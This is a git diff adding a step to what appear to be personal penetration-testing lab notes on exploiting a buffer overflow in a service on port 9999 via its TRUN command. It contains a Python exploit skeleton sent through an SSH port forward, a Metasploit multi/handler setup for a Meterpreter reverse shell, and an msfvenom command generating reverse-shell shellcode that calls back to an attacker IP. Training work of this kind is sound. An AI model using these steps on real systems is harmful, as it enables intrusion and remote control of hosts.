@@ -443,4 +443,58 @@ We can try to exploit either 3389 or 9999
 
 ```
 
-## (13)
+## (13) 9999 Exploit
+```
+Now we need to generate shell code using msfconsole and make a .py 
+
+OVERFLOW.PY goes through 127.0.0.1:{RHP1} to port 9999 on Vuln HOST
+Using -S -O forward -L {RHP1}:VulnHost:9999
+MSFCONSOLE listens on another completely random {RHP2} that your payload must reach back to via FLOAT IP and {RHP2}
+
+
+STEP ONE
+
+CREATE.PY and create a forward to go from s.connect port to port 9999 on .179
+
+```
+overflow.py
+#!/usr/bin/env python
+import socket
+
+buf = "TRUN /.:/"
+buf += ""
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 49999))
+
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+
+s.close()
+```
+
+ssh -S -O forward -L 49999:<Vuln HOST>:9999
+
+STEP TWO
+
+MSFCONSOLE PAYLAOD
+```
+use multi/handler
+set LPORT 54321
+set LHOST 0.0.0.0
+set payload windows/meterpreter/reverse_tcp
+exploit
+```
+
+STEP 3
+
+Generate SHELL CODE
+```
+msfvenom -p windows/shell/reverse_tcp lhost=10.50.37.42 lport=54321 -b "\x00" -f python
+lhost is LINOPS FLOAT IP
+LPORT is RHP used in MSFCONSOLE
+```
+
+```
+
